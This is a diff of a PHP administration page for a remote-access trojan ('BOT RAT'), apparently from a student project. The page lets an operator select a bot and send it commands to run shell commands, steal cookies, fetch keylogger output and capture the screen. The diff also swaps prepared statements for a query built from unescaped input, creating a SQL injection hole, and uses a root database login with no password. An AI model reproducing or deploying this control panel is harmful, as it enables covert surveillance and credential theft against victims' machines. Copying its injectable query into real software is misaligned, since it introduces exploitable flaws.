@@ -1,24 +1,31 @@
 <?php
-if ((isset($_GET['ip']) && !empty($_GET['ip'])) && (isset($_GET['port']) && !empty($_GET['port']))) {
-    $ip =  $_GET['ip'];
-    $port =  $_GET['port'];
-} else if ((isset($_POST['ip']) && !empty($_POST['ip'])) && (isset($_POST['port']) && !empty($_POST['port']))) {
-    $ip =  $_POST['ip'];
-    $port =  $_POST['port'];
+if ((isset($_GET['ID']) && !empty($_GET['ID']))) {
+    $ID = $_GET['ID'];
+} else if ((isset($_POST['ID']) && !empty($_POST['IDp']))) {
+    $ID = $_POST['ID'];
 } else {
     $bot = 'no bot';
 }
+$link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
+mysqli_select_db($link, "pbl4_v2");
+$sql = "SELECT * FROM botes WHERE ID='$ID'";
+$result = mysqli_query($link, $sql);
+
+while ($row = mysqli_fetch_array($result)) {
+    $ip = $row['ip'];
+    $port = $row['port'];
+}
+
+
 $fp = fopen('botActive.txt', 'w');
+fwrite($fp, $ID);
+fwrite($fp, '&');
 fwrite($fp, $ip);
 fwrite($fp, '&');
 fwrite($fp, $port);
 fclose($fp);
-$link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
-mysqli_select_db($link, "pbl4_v2");
-$sql = "SELECT * FROM botes WHERE ip='$ip' && port='$port'";
-$result = mysqli_query($link, $sql);
-$row = mysqli_fetch_assoc($result);
 ?>
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -46,11 +53,13 @@ $row = mysqli_fetch_assoc($result);
     <div id="command-form">
         <img src="serverIcon.png" alt="" width="180vw">
         <h2>BOT RAT Administration Page</h2>
-        <form method="post" action="openBot.php?ip=<?php echo $ip ?>&port=<?php echo $port ?>" id="cmdform">
-            RAT BOT IP: <input type="text" name="ip" readonly value="<?php echo $ip ?>" /> <!-- Ấn Button sẽ lấy value của cái này rồi chạy file này từ đầu -> name = "bot"-->
+        <form method="post" action="openBot.php?ID=<?php echo $ID ?>"
+            id="cmdform">
+            RAT BOT IP: <input type="text" name="ip" readonly value="<?php echo $ip ?>" />
+            <!-- Ấn Button sẽ lấy value của cái này rồi chạy file này từ đầu -> name = "bot"-->
             <br><br>
             RAT BOT PORT: <input type="text" name="port" readonly value="<?php echo $port;
-                                                                            mysqli_close($link); ?>" />
+            mysqli_close($link); ?>" />
             <p>Please enter your command: </p>
             <input type="text" name="cmdstr" size="35%">
             <p><input type="submit" name="buttonCmd" value="Execute Cmd"></p>
@@ -65,16 +74,10 @@ $row = mysqli_fetch_assoc($result);
 </html>
 <?php
 if (isset($_POST['buttonCmd'])) {
-    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
-    if (mysqli_connect_errno()) exit;
+
     if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
         $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
         echo 'Received: ' . $cmdstr . '<br>';
-        $query = "UPDATE botes SET command='getcmd' WHERE ip=? AND port=?";
-        $stmt = $db->prepare($query);
-        $stmt->bind_param('ss', $ip, $port); 
-        $stmt->execute();
-        $db->close();
         $fp = fopen('commandBot.txt', 'w');
         fwrite($fp, "getcmd");
         fwrite($fp, '&');
@@ -82,16 +85,10 @@ if (isset($_POST['buttonCmd'])) {
         fclose($fp);
     }
 } else if (isset($_POST['buttonCookie'])) {
-    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
-    if (mysqli_connect_errno()) exit;
+
     if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
         $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
-        echo 'Received: ' . $cmdstr . '<br>'; 
-        $query = "UPDATE botes SET command='getcookie' WHERE ip=? AND port=?";
-        $stmt = $db->prepare($query);
-        $stmt->bind_param('ss', $ip, $port);
-        $stmt->execute();
-        $db->close();
+        echo 'Received: ' . $cmdstr . '<br>';
         $fp = fopen('commandBot.txt', 'w');
         fwrite($fp, "getcookie");
         fwrite($fp, '&');
@@ -99,16 +96,10 @@ if (isset($_POST['buttonCmd'])) {
         fclose($fp);
     }
 } else if (isset($_POST['buttonKeylogger'])) {
-    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
-    if (mysqli_connect_errno()) exit;
+
     if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
-        $cmdstr = $_POST['cmdstr']; 
+        $cmdstr = $_POST['cmdstr'];
         echo 'Received: ' . $cmdstr . '<br>';
-        $query = "UPDATE botes SET command='getkeylogger' WHERE ip=? AND port=?";
-        $stmt = $db->prepare($query);
-        $stmt->bind_param('ss', $ip, $port);
-        $stmt->execute();
-        $db->close();
         $fp = fopen('commandBot.txt', 'w');
         fwrite($fp, "getkeylogger");
         fwrite($fp, '&');
@@ -116,16 +107,9 @@ if (isset($_POST['buttonCmd'])) {
         fclose($fp);
     }
 } else if (isset($_POST['buttonCapture'])) {
-    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
-    if (mysqli_connect_errno()) exit;
     if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
         $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
         echo 'Received: ' . $cmdstr . '<br>';
-        $query = "UPDATE botes SET command='getcapture' WHERE ip=? AND port=?";
-        $stmt = $db->prepare($query);
-        $stmt->bind_param('ss', $ip, $port);
-        $stmt->execute();
-        $db->close();
         $fp = fopen('commandBot.txt', 'w');
         fwrite($fp, "getcapture");
         fwrite($fp, '&');
